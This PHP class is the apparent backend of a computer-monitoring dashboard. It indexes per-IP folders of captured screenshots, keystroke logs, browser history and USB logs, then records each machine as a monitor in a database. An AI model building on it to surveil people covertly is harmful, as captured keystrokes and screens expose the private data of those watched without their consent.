<?php
require_once BASEPATH . 'app/config/config.php';

class DataSyncService {
    private $db;
    
    public function __construct() {
        $this->db = Database::getInstance();
    }
    
    /**
     * Get all IP directories from the data folders
     */
    public function getIPDirectories() {
        $ip_dirs = [];
        
        // Debug: Log directory paths
        error_log("DataSync - Scanning SCREENS_DIR: " . SCREENS_DIR);
        error_log("DataSync - SCREENS_DIR exists: " . (is_dir(SCREENS_DIR) ? 'Yes' : 'No'));
        
        // Scan screens directory
        if (is_dir(SCREENS_DIR)) {
            $files = scandir(SCREENS_DIR);
            error_log("DataSync - Found " . count($files) . " items in SCREENS_DIR");
            foreach ($files as $file) {
                if ($file === '.' || $file === '..') continue;
                if (is_dir(SCREENS_DIR . $file)) {
                    $ip_address = $this->extractIPFromIdentifier($file);
                    error_log("DataSync - Found directory: {$file}, extracted IP: {$ip_address}");
                    $ip_dirs[$file] = [
                        'identifier' => $file,
                        'screens' => true,
                        'thumbnails' => false,
                        'logs' => false,
                        'ip_address' => $ip_address
                    ];
                }
            }
        }
        
        // Scan thumbnails directory
        if (is_dir(THUMBNAILS_DIR)) {
            $files = scandir(THUMBNAILS_DIR);
            foreach ($files as $file) {
                if ($file === '.' || $file === '..') continue;
                if (is_dir(THUMBNAILS_DIR . $file)) {
                    if (!isset($ip_dirs[$file])) {
                        $ip_address = $this->extractIPFromIdentifier($file);
                        $ip_dirs[$file] = [
                            'identifier' => $file,
                            'screens' => false,
                            'thumbnails' => false,
                            'logs' => false,
                            'ip_address' => $ip_address
                        ];
                    }
                    $ip_dirs[$file]['thumbnails'] = true;
                }
            }
        }
        
        // Scan logs directory
        if (is_dir(LOGS_DIR)) {
            $files = scandir(LOGS_DIR);
            foreach ($files as $file) {
                if ($file === '.' || $file === '..') continue;
                if (is_dir(LOGS_DIR . $file)) {
                    if (!isset($ip_dirs[$file])) {
                        $ip_address = $this->extractIPFromIdentifier($file);
                        $ip_dirs[$file] = [
                            'identifier' => $file,
                            'screens' => false,
                            'thumbnails' => false,
                            'logs' => false,
                            'ip_address' => $ip_address
                        ];
                    }
                    $ip_dirs[$file]['logs'] = true;
                }
            }
        }
        
        error_log("DataSync - Total IP directories found: " . count($ip_dirs));
        return $ip_dirs;
    }
    
    /**
     * Extract IP address from directory identifier
     */
    private function extractIPFromIdentifier($identifier) {
        if (strpos($identifier, 'ip_') === 0) {
            $ip_part = substr($identifier, 3);
            // The identifier format is ip_192.168.1.49, so we just return the IP part
            // No conversion needed since the IP is stored as-is in the directory name
            return $ip_part;
        }
        return null;
    }
    
    /**
     * Get directory size
     */
    public function getDirectorySize($dir) {
        $size = 0;
        if (!is_dir($dir)) return 0;
        
        $files = scandir($dir);
        foreach ($files as $file) {
            if ($file === '.' || $file === '..') continue;
            
            $path = $dir . '/' . $file;
            if (is_dir($path)) {
                $size += $this->getDirectorySize($path);
            } else {
                $size += filesize($path);
            }
        }
        return $size;
    }
    
    /**
     * Format file size
     */
    public function formatFileSize($bytes) {
        $units = ['B', 'KB', 'MB', 'GB'];
        $bytes = max($bytes, 0);
        $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
        $pow = min($pow, count($units) - 1);
        $bytes /= pow(1024, $pow);
        return round($bytes, 2) . ' ' . $units[$pow];
    }
    
    /**
     * Get latest screenshot for an IP
     */
    public function getLatestScreenshot($ip_identifier) {
        $screens_dir = SCREENS_DIR . $ip_identifier;
        
        // Debug: Log directory check
        error_log("DataSync - Checking screens directory: {$screens_dir}");
        error_log("DataSync - Directory exists: " . (is_dir($screens_dir) ? 'Yes' : 'No'));
        
        if (!is_dir($screens_dir)) {
            error_log("DataSync - Directory does not exist: {$screens_dir}");
            return null;
        }
        
        $latest_file = null;
        $latest_time = 0;
        $file_count = 0;
        
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($screens_dir, RecursiveDirectoryIterator::SKIP_DOTS)
        );
        
        foreach ($iterator as $file) {
            if ($file->isFile() && in_array($file->getExtension(), ['jpg', 'jpeg', 'png'])) {
                $file_count++;
                $file_time = $file->getMTime();
                if ($file_time > $latest_time) {
                    $latest_time = $file_time;
                    $latest_file = $file->getPathname();
                }
            }
        }
        
        // Debug: Log results
        error_log("DataSync - Found {$file_count} image files in {$screens_dir}");
        error_log("DataSync - Latest screenshot: " . ($latest_file ? $latest_file : 'None'));
        
        return $latest_file;
    }
    
    /**
     * Get logs for an IP
     */
    public function getLogs($ip_identifier) {
        $logs_dir = LOGS_DIR . $ip_identifier;
        
        $logs = [
            'browser_history' => [],
            'key_logs' => [],
            'usb_logs' => []
        ];
        
        if (is_dir($logs_dir)) {
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($logs_dir, RecursiveDirectoryIterator::SKIP_DOTS)
            );
            
            foreach ($iterator as $file) {
                if ($file->isFile()) {
                    $filename = $file->getFilename();
                    $filepath = $file->getPathname();
                    
                    if (strpos($filename, 'browser_history') !== false) {
                        $logs['browser_history'][] = [
                            'file' => $filename,
                            'path' => $filepath,
                            'size' => filesize($filepath),
                            'modified' => date('Y-m-d H:i:s', filemtime($filepath))
                        ];
                    } elseif (strpos($filename, 'key_logs') !== false) {
                        $logs['key_logs'][] = [
                            'file' => $filename,
                            'path' => $filepath,
                            'size' => filesize($filepath),
                            'modified' => date('Y-m-d H:i:s', filemtime($filepath))
                        ];
                    } elseif (strpos($filename, 'usb_logs') !== false) {
                        $logs['usb_logs'][] = [
                            'file' => $filename,
                            'path' => $filepath,
                            'size' => filesize($filepath),
                            'modified' => date('Y-m-d H:i:s', filemtime($filepath))
                        ];
                    }
                }
            }
        }
        
        // Sort each log type by modification time (newest first)
        foreach ($logs as $log_type => &$log_files) {
            usort($log_files, function($a, $b) {
                return strtotime($b['modified']) - strtotime($a['modified']);
            });
        }
        
        return $logs;
    }
    
    /**
     * Get all screenshots for an IP, with optional date filtering
     */
    public function getAllScreenshots($ip_identifier, $start_date = null, $end_date = null) {
        $screens_dir = SCREENS_DIR . $ip_identifier;
        $thumbnails_dir = THUMBNAILS_DIR . $ip_identifier;
        $screenshots = [];
        $start_ts = $start_date ? strtotime($start_date . ' 00:00:00') : null;
        $end_ts = $end_date ? strtotime($end_date . ' 23:59:59') : null;
        if (is_dir($screens_dir)) {
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($screens_dir, RecursiveDirectoryIterator::SKIP_DOTS)
            );
            foreach ($iterator as $file) {
                if ($file->isFile() && in_array($file->getExtension(), ['jpg', 'jpeg', 'png'])) {
                    $file_mtime = $file->getMTime();
                    // Date filtering
                    if (($start_ts && $file_mtime < $start_ts) || ($end_ts && $file_mtime > $end_ts)) {
                        continue;
                    }
                    $relative_path = str_replace($screens_dir . '/', '', $file->getPathname());
                    $thumbnail_path = $thumbnails_dir . '/' . $relative_path;
                    $screenshots[] = [
                        'full_path' => $file->getPathname(),
                        'thumbnail_path' => file_exists($thumbnail_path) ? $thumbnail_path : $file->getPathname(),
                        'filename' => $file->getFilename(),
                        'size' => filesize($file->getPathname()),
                        'modified' => date('Y-m-d H:i:s', $file_mtime),
                        'relative_path' => $relative_path,
                        'time_diff_seconds' => time() - $file_mtime
                    ];
                }
            }
            // Sort by modification time (newest first)
            usort($screenshots, function($a, $b) {
                return strtotime($b['modified']) - strtotime($a['modified']);
            });
        }
        return $screenshots;
    }
    
    /**
     * Sync database monitors with actual data directories
     */
    public function syncMonitorsWithData() {
        $ip_dirs = $this->getIPDirectories();
        $synced_count = 0;
        
        // Debug: Log found directories
        error_log("DataSync - Found " . count($ip_dirs) . " IP directories");
        foreach ($ip_dirs as $identifier => $data) {
            error_log("DataSync - Directory: {$identifier}, IP: {$data['ip_address']}, Screens: " . ($data['screens'] ? 'Yes' : 'No'));
        }
        
        foreach ($ip_dirs as $identifier => $data) {
            if ($data['ip_address']) {
                // Check if monitor exists in database
                $existing = $this->db->fetch(
                    "SELECT * FROM tbl_monitor_ips WHERE ip_address = :ip",
                    ['ip' => $data['ip_address']]
                );
                
                if (!$existing) {
                    // Create new monitor entry
                    $this->db->insert('tbl_monitor_ips', [
                        'name' => 'Monitor ' . $data['ip_address'],
                        'ip_address' => $data['ip_address'],
                        'username' => 'Unknown',
                        'type' => 'desktop',
                        'monitor_status' => 1,
                        'last_monitor_tic' => date('Y-m-d H:i:s')
                    ]);
                    $synced_count++;
                    error_log("DataSync - Created new monitor for IP: {$data['ip_address']}");
                } else {
                    error_log("DataSync - Monitor already exists for IP: {$data['ip_address']}");
                    // Update last activity if we have recent data
                    $latest_screenshot = $this->getLatestScreenshot($identifier);
                    if ($latest_screenshot) {
                        $this->db->update('tbl_monitor_ips', 
                            ['last_monitor_tic' => date('Y-m-d H:i:s', filemtime($latest_screenshot))],
                            ['id' => $existing['id']]
                        );
                        error_log("DataSync - Updated last activity for IP: {$data['ip_address']}");
                    }
                }
            }
        }
        
        error_log("DataSync - Synced {$synced_count} new monitors");
        return $synced_count;
    }
}
?> 